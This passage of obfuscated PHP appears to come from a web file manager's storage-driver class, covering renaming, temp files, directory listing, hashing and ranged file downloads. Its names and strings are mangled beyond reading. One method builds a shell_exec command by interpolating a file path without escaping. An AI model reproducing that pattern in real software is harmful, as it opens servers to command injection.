$_SERVER[¹…ÕÄ]; $CÉŠ—Şæ¸© = rtrim($D £ìì¨ù, $E˜›‹°›Œó[8]) . $E˜›‹°›Œó[8] . $A˜’œÈ½£; $B©íÊ½î”§ = $this->exist($CÉŠ—Şæ¸©); return $B©íÊ½î”§ ? $CÉŠ—Şæ¸© : !1; } public function setModifyTime($fÓŞáÒã‚, $fí‡£ôµáŸ = '') { } public function renameObject($C£Ÿ¤½‡ßÉ, $cİ•—›‰ÎĞ) { goto cÀ‚ƒÆºÄÔ; cÀ‚ƒÆºÄÔ: $bòŸ÷š˜ø… =& $_SERVER[¹…ÕÄ]; $d”¯§³²ã­ = $cİ•—›‰ÎĞ; Hook::trigger($bòŸ÷š˜ø…[72], $this, $C£Ÿ¤½‡ßÉ, $this, $this->pathFather($C£Ÿ¤½‡ßÉ) . $cİ•—›‰ÎĞ); goto fîªª†Ê¡š; CîÑòÀñÇ: return $D­Ò‘‘–³¼ ? $cİ•—›‰ÎĞ : !1; goto D÷ô®ÍÕÓâ; fîªª†Ê¡š: $C£Ÿ¤½‡ßÉ = $this->getPathOuter($C£Ÿ¤½‡ßÉ); $cİ•—›‰ÎĞ = $this->pathFather($C£Ÿ¤½‡ßÉ) . $cİ•—›‰ÎĞ; if (IO::isFile($C£Ÿ¤½‡ßÉ)) { $D­Ò‘‘–³¼ = IO::copy($C£Ÿ¤½‡ßÉ, $this->pathFather($C£Ÿ¤½‡ßÉ), REPEAT_RENAME_FOLDER, $d”¯§³²ã­); if ($D­Ò‘‘–³¼) { IO::remove($C£Ÿ¤½‡ßÉ); } } else { $D­Ò‘‘–³¼ = IO::mkdir($cİ•—›‰ÎĞ); if (!$D­Ò‘‘–³¼) { return !1; } $bÁÛ˜¸ÄÚÖ = IO::listPath($C£Ÿ¤½‡ßÉ, !0); $DÃ³˜ìÜ = array_merge($bÁÛ˜¸ÄÚÖ[$bòŸ÷š˜ø…[73]], $bÁÛ˜¸ÄÚÖ[$bòŸ÷š˜ø…[74]]); foreach ($DÃ³˜ìÜ as $D‡¹³µ´˜) { IO::move($D‡¹³µ´˜[$bòŸ÷š˜ø…[75]], $cİ•—›‰ÎĞ, REPEAT_RENAME_FOLDER); } IO::remove($C£Ÿ¤½‡ßÉ); } goto CîÑòÀñÇ; D÷ô®ÍÕÓâ: } public function tempFile($DÚ×íé™÷ = '', $AÇøºÉñåĞ = '') { goto dÊ¨¤â¬¡â; dÊ¨¤â¬¡â: if (!$DÚ×íé™÷) { $DÚ×íé™÷ = rand_string(15); } $CÏ²ˆƒé‡Ë = TEMP_FILES . rand_string(15) . $_SERVER[¹…ÕÄ][8]; @mkdir($CÏ²ˆƒé‡Ë, 511, !0); goto F­¾•Ìàí; F­¾•Ìàí: $D¹ñ‚£âš = $CÏ²ˆƒé‡Ë . $DÚ×íé™÷; @touch($D¹ñ‚£âš); if ($AÇøºÉñåĞ) { file_put_contents($D¹ñ‚£âš, $AÇøºÉñåĞ); } goto EŒÉÕ‚¦«Ë; EŒÉÕ‚¦«Ë: return $D¹ñ‚£âš; goto A ·›‰‹§Í; A ·›‰‹§Í: } public function tempFileRemve($D„±ã˜˜—) { @unlink($D„±ã˜˜—); @rmdir($this->pathFather($D„±ã˜˜—)); } public function mkfile($bÍÉ†óÍÕ , $a¬©ÄÑğ„ = '', $a¦Áíõ½ÃŠ = REPEAT_RENAME) { } public function mkdir($a›Í‡õîæÃ, $BÛ„ÅµîĞ× = REPEAT_SKIP) { } public function delFile($AëÌÍæ‚†) { } public function delFolder($Aˆˆç‰ª×Ö) { } public function copyFile($B…»ê“¦Ğ, $FÕİåŒ¤‹) { } public function moveFile($F’¿š°¸, $FæïÚ„À‹ˆ) { } public function remove($DåÜÎÕ‘ÛÂ) { if ($this->isFile($DåÜÎÕ‘ÛÂ)) { return $this->delFile($DåÜÎÕ‘ÛÂ); } return $this->delFolder($DåÜÎÕ‘ÛÂ); } public function rename($DªÄ–çšà, $bñ»äÄµÖ³) { } public function exist($f¢Œä—¥ò«) { } public function findByHash($c‘Ãî²Î¯š = '', $CÖ…‰¶ˆëÇ = '') { return !1; } public function isFile($bĞŞ¿”¯) { } public function isFolder($Cöõê´‚ ö) { } public function size($f”Ëƒç¹Ö‰) { } public function info($b‘–¬£áâ) { } public function infoSimple($cÃŠÊø•––) { return $this->info($cÃŠÊø•––); } public function infoAuth($EÃïù×™«†) { return $this->info($EÃïù×™«†); } public function infoFull($bÖÉ±ŠÖÜ‚) { return $this->info($bÖÉ±ŠÖÜ‚); } public function infoWithChildren($aÌß °¨) { $B³ê ‡óÜ™ =& $_SERVER[¹…ÕÄ]; static $bØ³’¨Š˜ = array(); if (isset($bØ³’¨Š˜[$aÌß °¨])) { return $bØ³’¨Š˜[$aÌß °¨]; } $f¢†é„óÂ = $this->info($aÌß °¨); if ($f¢†é„óÂ && $f¢†é„óÂ[$B³ê ‡óÜ™[29]] == $B³ê ‡óÜ™[76]) { $B…¾ô³•Ú± = array($B³ê ‡óÜ™[77] => 0, $B³ê ‡óÜ™[78] => 0, $B³ê ‡óÜ™[79] => 0); $this->infoChildren($aÌß °¨, $B…¾ô³•Ú±); $f¢†é„óÂ[$B³ê ‡óÜ™[77]] = $B…¾ô³•Ú±[$B³ê ‡óÜ™[77]]; $f¢†é„óÂ[$B³ê ‡óÜ™[80]] = array($B³ê ‡óÜ™[81] => $B…¾ô³•Ú±[$B³ê ‡óÜ™[78]], $B³ê ‡óÜ™[82] => $B…¾ô³•Ú±[$B³ê ‡óÜ™[79]]); $bØ³’¨Š˜[$aÌß °¨] = $f¢†é„óÂ; } return $f¢†é„óÂ; } public function listPath($c…ÜêÖ•©â, $E„¹ÜÂæ† = false) { } public function has($dã¯¢ÑÔ¥´, $E—âÀÛğ¯Ï = false, $aÍ°±„Ñ = false) { } public function canRead($aƒ…¯ãÂÂ) { } public function canWrite($C¤óé«ÍÛÃ) { } public function getContent($F¼·ÃØ´) { } public function setContent($c¬– İ·Š‹, $EÔŞ¯Ã¾Ü‚ = '') { } protected function infoChildren($a³Ú‚³óªº, &$FºÍ½‡…è) { $eäŒ¾Á‰´‹ =& $_SERVER[¹…ÕÄ]; check_abort_echo(); $Eˆª½Ìéäå = $this->listPath($a³Ú‚³óªº, !0); $Eˆª½Ìéäå = array_merge($Eˆª½Ìéäå[$eäŒ¾Á‰´‹[74]], $Eˆª½Ìéäå[$eäŒ¾Á‰´‹[73]]); foreach ($Eˆª½Ìéäå as $cˆ¸ß‰ÍÛÆ) { if ($cˆ¸ß‰ÍÛÆ[$eäŒ¾Á‰´‹[29]] == $eäŒ¾Á‰´‹[76]) { $FºÍ½‡…è[$eäŒ¾Á‰´‹[79]]++; $Aõ…îÖ = $this->getPathInner($cˆ¸ß‰ÍÛÆ[$eäŒ¾Á‰´‹[75]]); $this->infoChildren($Aõ…îÖ, $FºÍ½‡…è); } else { $FºÍ½‡…è[$eäŒ¾Á‰´‹[78]]++; $FºÍ½‡…è[$eäŒ¾Á‰´‹[77]] += $cˆ¸ß‰ÍÛÆ[$eäŒ¾Á‰´‹[77]]; } } } public function fileSubstr($E¨·Ö¡÷„, $F™ÇæÂŞßÑ, $e×ªŞ˜ó¨Æ) { } public function listAll($EÓÈáÆ±æÇ) { } public function listAllMake($bÕ£§Å¿ÒÆ, &$Cä­¹ÙĞÜÀ) { $fŠ»İğœ¸– =& $_SERVER[¹…ÕÄ]; check_abort_echo(); $FÛïÔĞ™Å¨ = $this->listPath($bÕ£§Å¿ÒÆ, !0); if (!$FÛïÔĞ™Å¨) { return; } $FÖ³ÕÙñ·• = array_merge($FÛïÔĞ™Å¨[$fŠ»İğœ¸–[74]], $FÛïÔĞ™Å¨[$fŠ»İğœ¸–[73]]); foreach ($FÖ³ÕÙñ·• as $då·­Ò¢Üê) { goto EŸ–Ñó‰ÈŠ; Bƒ³é÷“î¿: $this->listAllMake($då·­Ò¢Üê[$fŠ»İğœ¸–[75]], $Cä­¹ÙĞÜÀ); goto bçò³¡ÚØ; EŸ–Ñó‰ÈŠ: $cÜ•Ê–ÊÂÓ = $då·­Ò¢Üê[$fŠ»İğœ¸–[29]] == $fŠ»İğœ¸–[76]; $D»³äºæÍğ = array($fŠ»İğœ¸–[75] => $då·­Ò¢Üê[$fŠ»İğœ¸–[75]], $fŠ»İğœ¸–[76] => $cÜ•Ê–ÊÂÓ); if (isset($då·­Ò¢Üê[$fŠ»İğœ¸–[77]])) { $D»³äºæÍğ[$fŠ»İğœ¸–[77]] = $då·­Ò¢Üê[$fŠ»İğœ¸–[77]]; } goto C¿­‡ôÕÛ«; C¿­‡ôÕÛ«: if (isset($då·­Ò¢Üê[$fŠ»İğœ¸–[83]])) { $D»³äºæÍğ[$fŠ»İğœ¸–[83]] = $då·­Ò¢Üê[$fŠ»İğœ¸–[83]]; } if (!$cÜ•Ê–ÊÂÓ) { $Cä­¹ÙĞÜÀ[] = $D»³äºæÍğ; continue; } $Cä­¹ÙĞÜÀ[] = $D»³äºæÍğ; goto Bƒ³é÷“î¿; bçò³¡ÚØ: } } public function listAllSimple($dáæôÄ¼¤Ş) { $A–ˆê‰¿‰ =& $_SERVER[¹…ÕÄ]; $a´ïƒ…¨øÓ = array(); $A™¦ó—’¼· = $this->listAll($dáæôÄ¼¤Ş); $a¡ïùõëÍ = $this->getPathOuter($dáæôÄ¼¤Ş); foreach ($A™¦ó—’¼· as $Aß¾ÅøÃêÅ) { goto EõÖˆè†íÌ; E¢ù‚á‚¨Á: if (!$Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[76]]) { $Aİ‹­ƒª¤[$A–ˆê‰¿‰[85]] = $fØÔ¡È‡àî; } $a´ïƒ…¨øÓ[] = $Aİ‹­ƒª¤; goto f›¥Òùåš¾; A¯Ú„Ñ‚¥: $Aİ‹­ƒª¤ = array($A–ˆê‰¿‰[75] => $B‡Ê¥ª¸ç©, $A–ˆê‰¿‰[76] => $Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[76]]); if (isset($Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[77]]) && !$Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[76]]) { $Aİ‹­ƒª¤[$A–ˆê‰¿‰[77]] = $Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[77]]; } if (isset($Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[83]])) { $Aİ‹­ƒª¤[$A–ˆê‰¿‰[83]] = $Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[83]]; } goto E¢ù‚á‚¨Á; EõÖˆè†íÌ: $fØÔ¡È‡àî = $Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[75]]; $B‡Ê¥ª¸ç© = $Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[75]]; if (isset($Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[84]])) { $fØÔ¡È‡àî = $Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[84]][$A–ˆê‰¿‰[75]]; $Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[77]] = $Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[84]][$A–ˆê‰¿‰[77]]; $Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[83]] = $Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[84]][$A–ˆê‰¿‰[83]]; } else { $B‡Ê¥ª¸ç© = substr($Aß¾ÅøÃêÅ[$A–ˆê‰¿‰[75]], strlen(get_path_father($a¡ïùõëÍ))); $B‡Ê¥ª¸ç© = $A–ˆê‰¿‰[8] . ltrim($B‡Ê¥ª¸ç©, $A–ˆê‰¿‰[8]); } goto A¯Ú„Ñ‚¥; f›¥Òùåš¾: } return $a´ïƒ…¨øÓ; } public function upload($B·„¶„ø‚“, $fÓ›„¹®Şå, $A™ó„ô¿Œ‹ = false, $cÓ”„Ôİº¦ = REPEAT_REPLACE) { } public function uploadFileByID($B›Ü¡¥ò, $d×”á³àÖÎ, $E™ËöáØÉ©) { } public function uploadFileByPath($fÆ«¸²»¸, $a–×µ»†›•, $AŞ‡¹‰²æ = array()) { } public function isUploadServer() { $e˜¤òÕ­Ò =& $_SERVER[¹…ÕÄ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $e˜¤òÕ­Ò[86]) { return !0; } return $GLOBALS[$e˜¤òÕ­Ò[6]][$e˜¤òÕ­Ò[87]][$e˜¤òÕ­Ò[88]]; } public function isFileOutServer() { $CÚ…“»İö· =& $_SERVER[¹…ÕÄ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $CÚ…“»İö·[86]) { return !0; } return $GLOBALS[$CÚ…“»İö·[6]][$CÚ…“»İö·[87]][$CÚ…“»İö·[89]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($Eˆ¼ÃåÛÄˆ) { $fœ‡ßºö• =& $_SERVER[¹…ÕÄ]; if (!$this->isCdnHost()) { return $Eˆ¼ÃåÛÄˆ; } return str_replace(trim(get_url_root($Eˆ¼ÃåÛÄˆ), $fœ‡ßºö•[8]), trim($this->cdnHost, $fœ‡ßºö•[8]), $Eˆ¼ÃåÛÄˆ); } public function uploadLink($bêòØ¨ÕĞ, $Fó¨»ÁÍíÕ = 0) { goto AÄ‚Ç¥§ˆñ; AÄ‚Ç¥§ˆñ: $Dµ¢ÑÃË =& $_SERVER[¹…ÕÄ]; if ($this->isUploadServer()) { return; } $cÁå²Ìô¬â = $this->getType(); goto bå¯Ì®ùƒÃ; eÌéÒğ¯: $DÇ¿·†Ò§ = $Fó¨»ÁÍíÕ <= $DÂÀ¹êÖÈé ? $Dµ¢ÑÃË[90] : $Dµ¢ÑÃË[91]; $FÓ¼Å¶°ë‡ = (!$Fó¨»ÁÍíÕ ? 1 : ceil($Fó¨»ÁÍíÕ / pow(1024, 3))) * 3600 * 4; $Fõ‰¹½õ¥“ = $this->{$DÇ¿·†Ò§}($bêòØ¨ÕĞ, $FÓ¼Å¶°ë‡); goto BÀ·â„‰ƒ; BÀ·â„‰ƒ: if ($Fõ‰¹½õ¥“) { $Fõ‰¹½õ¥“[$Dµ¢ÑÃË[92]] = $bêòØ¨ÕĞ; $Fõ‰¹½õ¥“[$Dµ¢ÑÃË[93]] = $cÁå²Ìô¬â; } return $Fõ‰¹½õ¥“; goto E®“é–¹–µ; bå¯Ì®ùƒÃ: if (!in_array($cÁå²Ìô¬â, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $DÂÀ¹êÖÈé = 1024 * 1024 * 10; goto eÌéÒğ¯; E®“é–¹–µ: } public function uploadFormData($c»ÖÂ¦öĞñ, $CÃá—Ôè’é = 3600) { } public function multiUploadFormData($bƒØ¨†ÁÃÉ, $aäÌ°¿õ„Ä = 3600) { } public function download($AÒÙ¤ù‰¹, $bƒØ…˜èÊŠ) { } public function ext($F¬ôÕî³) { $cÔ‡±‡æ´ =& $_SERVER[¹…ÕÄ]; if (strpos($F¬ôÕî³, $cÔ‡±‡æ´[8]) === -1) { $eÙƒŞ“‰…ê = $F¬ôÕî³; } else { $eÙƒŞ“‰…ê = $this->pathThis($F¬ôÕî³); } $dÉÛ„ÚÛ¤Ï = $cÔ‡±‡æ´[33]; if (strstr($eÙƒŞ“‰…ê, $cÔ‡±‡æ´[94])) { $dÉÛ„ÚÛ¤Ï = substr($eÙƒŞ“‰…ê, strrpos($eÙƒŞ“‰…ê, $cÔ‡±‡æ´[94]) + 1); $dÉÛ„ÚÛ¤Ï = strtolower($dÉÛ„ÚÛ¤Ï); } if (strlen($dÉÛ„ÚÛ¤Ï) > 3 && preg_match($cÔ‡±‡æ´[95], $dÉÛ„ÚÛ¤Ï, $d°‡ÄœÖš³)) { $dÉÛ„ÚÛ¤Ï = $cÔ‡±‡æ´[33]; } return $dÉÛ„ÚÛ¤Ï; } public function pathThis($BÏÔé­Ê‘•) { $a¥ÂÁ·‚²ó =& $_SERVER[¹…ÕÄ]; $BÏÔé­Ê‘• = str_replace($a¥ÂÁ·‚²ó[96], $a¥ÂÁ·‚²ó[8], rtrim($BÏÔé­Ê‘•, $a¥ÂÁ·‚²ó[8])); $eŒ†í‹ˆ¥„ = strrpos($BÏÔé­Ê‘•, $a¥ÂÁ·‚²ó[8]); if ($eŒ†í‹ˆ¥„ === !1) { return $BÏÔé­Ê‘•; } return substr($BÏÔé­Ê‘•, $eŒ†í‹ˆ¥„ + 1); } public function pathFather($E›ã®”„ƒê) { $Eòˆã•ÁÖí =& $_SERVER[¹…ÕÄ]; $E›ã®”„ƒê = str_replace($Eòˆã•ÁÖí[96], $Eòˆã•ÁÖí[8], rtrim($E›ã®”„ƒê, $Eòˆã•ÁÖí[8])); $e¹®¦ÙÑ¸” = strrpos($E›ã®”„ƒê, $Eòˆã•ÁÖí[8]); if ($e¹®¦ÙÑ¸” === !1) { return $Eòˆã•ÁÖí[33]; } return substr($E›ã®”„ƒê, 0, $e¹®¦ÙÑ¸” + 1); } public function hashSimple($BÅ«”¹»ì‘) { goto a¯ÏôÅ; A¬Ï˜ğµÅ: $cµ……»Ñ = 200; $d‡Â¸ãŒñ‹ = 50; if ($fõ˜Ì‡ƒä <= $cµ……»Ñ * $d‡Â¸ãŒñ‹) { return $this->hashMd5($BÅ«”¹»ì‘) . $fõ˜Ì‡ƒä; } goto F–ï¾ã¢Ó; a¯ÏôÅ: $D›¦Äà˜Ìğ =& $_SERVER[¹…ÕÄ]; if (!$BÅ«”¹»ì‘) { return md5($D›¦Äà˜Ìğ[33]); } $fõ˜Ì‡ƒä = $this->size($BÅ«”¹»ì‘); goto A¬Ï˜ğµÅ; F–ï¾ã¢Ó: $Fš‘ÏäŸ³– = intval($fõ˜Ì‡ƒä / $d‡Â¸ãŒñ‹); $Cøåå®¤è = $D›¦Äà˜Ìğ[33]; for ($A•ò…Ÿéëà = 0; $A•ò…Ÿéëà < $d‡Â¸ãŒñ‹; $A•ò…Ÿéëà++) { $Cøåå®¤è .= $this->fileSubstr($BÅ«”¹»ì‘, $Fš‘ÏäŸ³– * $A•ò…Ÿéëà, $cµ……»Ñ); } goto c³‚µŒºÉà; c³‚µŒºÉà: $Cøåå®¤è .= $this->fileSubstr($BÅ«”¹»ì‘, $fõ˜Ì‡ƒä - $cµ……»Ñ, $cµ……»Ñ); return md5($Cøåå®¤è) . $fõ˜Ì‡ƒä; goto d—ôğ¥ÊÜÌ; d—ôğ¥ÊÜÌ: } public static $md5Cache = array(); public function hashMd5($Eˆšãö‹ã) { $Eˆšãö‹ã = $this->iconvSystem($Eˆšãö‹ã); if (isset(self::$md5Cache[$Eˆšãö‹ã])) { return self::$md5Cache[$Eˆšãö‹ã]; } self::$md5Cache[$Eˆšãö‹ã] = $this->hashMd5Shell($Eˆšãö‹ã); if (!self::$md5Cache[$Eˆšãö‹ã]) { self::$md5Cache[$Eˆšãö‹ã] = @md5_file($Eˆšãö‹ã); } return self::$md5Cache[$Eˆšãö‹ã]; } private function hashMd5Shell($EÍ“ „—´Ï) { goto Eˆ‘£°ë©–; Eˆ‘£°ë©–: $e½ÕÙµ­ˆò =& $_SERVER[¹…ÕÄ]; if (!function_exists($e½ÕÙµ­ˆò[97])) { return !1; } $böŸˆÄ—Š = array($e½ÕÙµ­ˆò[98], $e½ÕÙµ­ˆò[99]); goto Fô’½ÇÔå; e¾åŸš†Ô: $cãª·èéº  = shell_exec($aœ¥›¬éĞ . "\40\42{$EÍ“ „—´Ï}\42"); $cãª·èéº  = str_replace($e½ÕÙµ­ˆò[103], $e½ÕÙµ­ˆò[33], $cãª·èéº ); return substr($cãª·èéº , 0, 32); goto C”‰˜áÄ; Fô’½ÇÔå: $aœ¥›¬éĞ = Cache::get($e½ÕÙµ­ˆò[100]); if (!$aœ¥›¬éĞ) { $b–ƒŞÒğ‡ = BASIC_PATH . $e½ÕÙµ­ˆò[101]; $bç„‹îÖĞ = md5_file($b–ƒŞÒğ‡); $aœ¥›¬éĞ = $e½ÕÙµ­ˆò[102]; foreach ($böŸˆÄ—Š as $fˆí›…•Š½) { $cãª·èéº  = shell_exec($fˆí›…•Š½ . "\x20\42{$b–ƒŞÒğ‡}\42"); if ($cãª·èéº  && substr(trim($cãª·èéº ), 0, 32) == $bç„‹îÖĞ) { $aœ¥›¬éĞ = $fˆí›…•Š½; break; } } Cache::set($e½ÕÙµ­ˆò[100], $aœ¥›¬éĞ, 3600); } if ($aœ¥›¬éĞ == $e½ÕÙµ­ˆò[102]) { return !1; } goto e¾åŸš†Ô; C”‰˜áÄ: } public function link($D–á‡›«å) { return $D–á‡›«å; } public function fileOut($Aá½ŒÅ¿Ö, $DÎÛ‹ÁË¹ = false, $f“¨¦­²ñí = false, $Bï¢³¥‘ÆÓ = '') { goto BÌ£¶õ¦°‹; B¾ğñî“á…: header($dçÕŠğ÷Š[127]); header($dçÕŠğ÷Š[128]); header($dçÕŠğ÷Š[129]); goto aÓïÁæ·Ñï; aÓïÁæ·Ñï: if (isset($_SERVER[$dçÕŠğ÷Š[130]]) && strtotime($_SERVER[$dçÕŠğ÷Š[130]]) == $c¡À‡¥©Ô‹[$dçÕŠğ÷Š[83]]) { header($dçÕŠğ÷Š[131], !0, 304); die; } if (isset($_SERVER[$dçÕŠğ÷Š[132]]) && $_SERVER[$dçÕŠğ÷Š[132]] == $Bï¢³¥‘ÆÓ) { header($dçÕŠğ÷Š[133] . $Bï¢³¥‘ÆÓ, !0, 304); die; } header($dçÕŠğ÷Š[133] . $Bï¢³¥‘ÆÓ); goto eğÂø÷ì–; aÅàÊÈ„³×: $E½Ôà¹Ñ¤µ = $c¡À‡¥©Ô‹[$dçÕŠğ÷Š[77]]; $bã³èµ¶ì = gmdate($dçÕŠğ÷Š[109], $c¡À‡¥©Ô‹[$dçÕŠğ÷Š[83]]); $B—Ò™É©Ï = $f“¨¦­²ñí ? $f“¨¦­²ñí : $this->iconvApp($c¡À‡¥©Ô‹[$dçÕŠğ÷Š[28]]); goto b‰• ÷©ÖË; b‰• ÷©ÖË: $fïñ©ƒŸ = 0; $EøØ š¸ŠØ = $E½Ôà¹Ñ¤µ - 1; $C½ö°‡È¦¦ = $this->ext($B—Ò™É©Ï); goto Fá¡ˆÂ°Ò—; a‡ÓöÆ²Ùƒ: header($dçÕŠğ÷Š[119]); header($dçÕŠğ÷Š[120] . $e§æÓ‰ÓÍæ); $AÄôØŞì = rawurlencode($B—Ò™É©Ï); goto Fä«ô“ŒîÉ; b‡¼”Ğ‘ß¸: @ob_end_clean(); set_timeout(); $c¡À‡¥©Ô‹ = $this->infoFull($Aá½ŒÅ¿Ö); goto aÅàÊÈ„³×; BÌ£¶õ¦°‹: $dçÕŠğ÷Š =& $_SERVER[¹…ÕÄ]; $this->cacheMethod(null, null); if (!$Aá½ŒÅ¿Ö || !$this->exist($Aá½ŒÅ¿Ö)) { show_json(LNG($dçÕŠğ÷Š[104]), !1, $f“¨¦­²ñí); } goto AÃÎÏËË½°; e³µîìÚÏÀ: header($dçÕŠğ÷Š[137] . $E½Ôà¹Ñ¤µ); header($dçÕŠğ÷Š[138]); if (!$DÎÛ‹ÁË¹ && $C½ö°‡È¦¦ == $dçÕŠğ÷Š[139]) { if ($E½Ôà¹Ñ¤µ > 1024 * 1024 * 5) { die; } $E•ÌÆ”Ö‚Ş = $this->getContent($Aá½ŒÅ¿Ö); $E•ÌÆ”Ö‚Ş = Html::clearSVG($E•ÌÆ”Ö‚Ş); header($dçÕŠğ÷Š[140] . strlen($E•ÌÆ”Ö‚Ş)); echo $E•ÌÆ”Ö‚Ş; die; } goto F˜Ä®¥Äë; B„©¶Ì³„•: if ($_SERVER[$dçÕŠğ÷Š[156]] == $dçÕŠğ÷Š[157]) { return; } $b»î‘ÀÚ’‘ = 1024 * 100; $EÕÓ°„Ú® = 0; goto fÇèëçŠ·; fÇèëçŠ·: if ($f‹ìçà“ä¯) { $EÕÓ°„Ú® = intval(1000 * 1000 * ($b»î‘ÀÚ’‘ / $f‹ìçà“ä¯)); } while ($fïñ©ƒŸ <= $EøØ š¸ŠØ) { $f½ØÌ²ˆ°‹ = timeFloat(); check_abort(); $a¡õíš©Š” = $EøØ š¸ŠØ - $fïñ©ƒŸ + 1; if ($a¡õíš©Š” <= $b»î‘ÀÚ’‘) { $b»î‘ÀÚ’‘ = $a¡õíš©Š”; } echo $this->fileSubstr($Aá½ŒÅ¿Ö, $fïñ©ƒŸ, $b»î‘ÀÚ’‘); $fïñ©ƒŸ += $b»î‘ÀÚ’‘; if ($b»î‘ÀÚ’‘ == $a¡õíš©Š”) { $fïñ©ƒŸ = $EøØ š¸ŠØ + 1; } if ($EÕÓ°„Ú®) { $cÍó¹¶Úİ« = intval(1000 * 1000 * (timeFloat() - $f½ØÌ²ˆ°‹)); $d‰ìù²» = $EÕÓ°„Ú® - $cÍó¹¶Úİ«; if ($d‰ìù²» > 5) { usleep($d‰ìù²»); } } } goto B¡™ÅÆ††å; eğÂø÷ì–: header($dçÕŠğ÷Š[134] . $bã³èµ¶ì . $dçÕŠğ÷Š[126]); header($dçÕŠğ÷Š[135] . $B—Ò™É©Ï); header($dçÕŠğ÷Š[136]); goto e³µîìÚÏÀ; Fá¡ˆÂ°Ò—: if (in_array($C½ö°‡È¦¦, array($dçÕŠğ÷Š[110], $dçÕŠğ÷Š[111], $dçÕŠğ÷Š[112], $dçÕŠğ÷Š[113]))) { $C½ö°‡È¦¦ = $dçÕŠğ÷Š[114]; } if (!$Bï¢³¥‘ÆÓ) { $Bï¢³¥‘ÆÓ = md5($bã³èµ¶ì . $this->hashSimple($Aá½ŒÅ¿Ö)); } $Bï¢³¥‘ÆÓ = $dçÕŠğ÷Š[115] . $Bï¢³¥‘ÆÓ . $dçÕŠğ÷Š[115]; goto cğìíØĞ£; F˜Ä®¥Äë: $Aî”óáÑ‰µ = strtolower($_SERVER[$dçÕŠğ÷Š[141]]); if ($AâØì ó¡ && $Aî”óáÑ‰µ && $bø×îèù†) { if (strstr($Aî”óáÑ‰µ, $dçÕŠğ÷Š[142])) { header($dçÕŠğ÷Š[143] . $Aá½ŒÅ¿Ö); } else { if (strstr($Aî”óáÑ‰µ, $dçÕŠğ÷Š[144])) { header($dçÕŠğ÷Š[145] . $Aá½ŒÅ¿Ö); } else { if (strstr($Aî”óáÑ‰µ, $dçÕŠğ÷Š[146])) { header($dçÕŠğ÷Š[147] . $Aá½ŒÅ¿Ö); } } } if ($f‹ìçà“ä¯) { header($dçÕŠğ÷Š[148] . $f‹ìçà“ä¯); } return; } if (isset($_SERVER[$dçÕŠğ÷Š[149]])) { if (preg_match($dçÕŠğ÷Š[150], $_SERVER[$dçÕŠğ÷Š[149]], $eÅ³ã“Î‰›)) { $fïñ©ƒŸ = intval($eÅ³ã“Î‰›[1]); if (!empty($eÅ³ã“Î‰›[2])) { $EøØ š¸ŠØ = intval($eÅ³ã“Î‰›[2]); } } header($dçÕŠğ÷Š[151]); header("\x43\157\x6e\x74\x65\x6e\x74\55\122\x61\156\147\145\72\40\x62\x79\x74\145\163\x20{$fïñ©ƒŸ}\55{$EøØ š¸ŠØ}\x2f" . $E½Ôà¹Ñ¤µ); } else { header($dçÕŠğ÷Š[152]); } goto E© ï‹•ÎÓ; Fä«ô“ŒîÉ: $AÄôØŞì = $dçÕŠğ÷Š[115] . $AÄôØŞì . $dçÕŠğ÷Š[121] . $AÄôØŞì; if ($DÎÛ‹ÁË¹) { header($dçÕŠğ÷Š[122]); header($dçÕŠğ÷Š[123] . $AÄôØŞì); } else { header($dçÕŠğ÷Š[124] . $AÄôØŞì); } header($dçÕŠğ÷Š[125] . gmdate($dçÕŠğ÷Š[109], time() + 3600 * 24 * 30) . $dçÕŠğ÷Š[126]); goto B¾ğñî“á…; E© ï‹•ÎÓ: $fÜ…Îîô¯ = !0; if ($_SERVER[$dçÕŠğ÷Š[153]] == $dçÕŠğ÷Š[154] && $E½Ôà¹Ñ¤µ > 1204 * 1024 * 1024 * 2) { $fÜ…Îîô¯ = !1; } if ($fÜ…Îîô¯) { header($dçÕŠğ÷Š[155] . ($EøØ š¸ŠØ - $fïñ©ƒŸ + 1)); } goto B„©¶Ì³„•; AÃÎÏËË½°: $AâØì ó¡ = $this->getType() == $dçÕŠğ÷Š[105]; $bø×îèù† = $GLOBALS[$dçÕŠğ÷Š[6]][$dçÕŠğ÷Š[87]][$dçÕŠğ÷Š[106]][$dçÕŠğ÷Š[107]]; $f‹ìçà“ä¯ = (double) $GLOBALS[$dçÕŠğ÷Š[6]][$dçÕŠğ÷Š[87]][$dçÕŠğ÷Š[106]][$dçÕŠğ÷Š[108]] * 1024 * 1024; goto b‡¼”Ğ‘ß¸; cğìíØĞ£: $e§æÓ‰ÓÍæ = get_file_mime($C½ö°‡È¦¦); if (strstr($e§æÓ‰ÓÍæ, $dçÕŠğ÷Š[116])) { $e§æÓ‰ÓÍæ = $e§æÓ‰ÓÍæ . $dçÕŠğ÷Š[117]; } if ($DÎÛ‹ÁË¹ === !1 && !mime_support($e§æÓ‰ÓÍæ)) { $DÎÛ‹ÁË¹ = !0; $e§æÓ‰ÓÍæ = $dçÕŠğ÷Š[118]; } goto a‡ÓöÆ²Ùƒ; B¡™ÅÆ††å: } public function fileOutServer($cöµ¶èÉê, $bÊ¡¬¡àˆŸ = false, $Bñ¼Äö” = false, $dºŒ­É‰Õ = '') { $this->fileOut($cöµ¶èÉê, $bÊ¡¬¡àˆŸ, $Bñ¼Äö”, $dºŒ­É‰Õ); } public function fileOutLink($CºÆ‹ÃÁ) { header($_SERVER[¹…ÕÄ][158] . $CºÆ‹ÃÁ); die; } public function cacheMethod($Bá·•Í¾ÉÓ, $EŒÜ¦ÀÒÀ, $AŠ¡ì‰Õôò = null) { goto a‹ïËàÚëŠ; fËß‘Â¨ç»: if 